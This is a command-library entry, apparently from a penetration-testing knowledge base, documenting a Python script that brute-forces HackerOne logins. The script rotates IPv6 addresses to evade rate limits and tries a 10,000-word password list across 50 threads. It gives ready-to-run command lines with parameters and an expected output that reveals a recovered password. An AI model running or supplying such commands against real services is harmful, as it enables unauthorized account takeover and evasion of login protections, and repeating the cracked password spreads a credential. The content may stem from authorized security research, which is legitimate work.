---
id: cmd-run-brute-script
data: python hackeronebrute.py ██████████ 10k_most_common.txt venet0 50
tags:
  - brute-force
  - python
type: command
output: >-
  Progress bars showing ~30 pw/s, [SUCCESS] Found the right password:
  Geniaal2!!, Total time: 335 seconds
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:52.763Z'
verified: false
validated: true
submitted: true
---
# run-hackerone-brute-force-script

## Command

```bash
python hackeronebrute.py ██████████ 10k_most_common.txt venet0 50
```

## Description

Executes a custom Python script to brute-force the HackerOne login by rotating IPv6 addresses and trying passwords from a list.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ██████████ | Target username | Yes |
| 10k_most_common.txt | Password dictionary path | Yes |
| venet0 | Network interface for IP rotation | Yes |
| 50 | Number of threads | Yes |

## Examples

### Basic Usage

```bash
python hackeronebrute.py testuser passwords.txt eth0 10
```

### Advanced Usage

With debug:

```bash
python hackeronebrute.py ██████████ 10k_most_common.txt venet0 50 --debug
```

## Expected Output

Progress bars showing ~30 pw/s, [SUCCESS] Found the right password: Geniaal2!!, Total time: 335 seconds.

## Related

- [[procedures/Execute-Brute-Force-Script]]
- [[tools/hackeronebrute.py]]
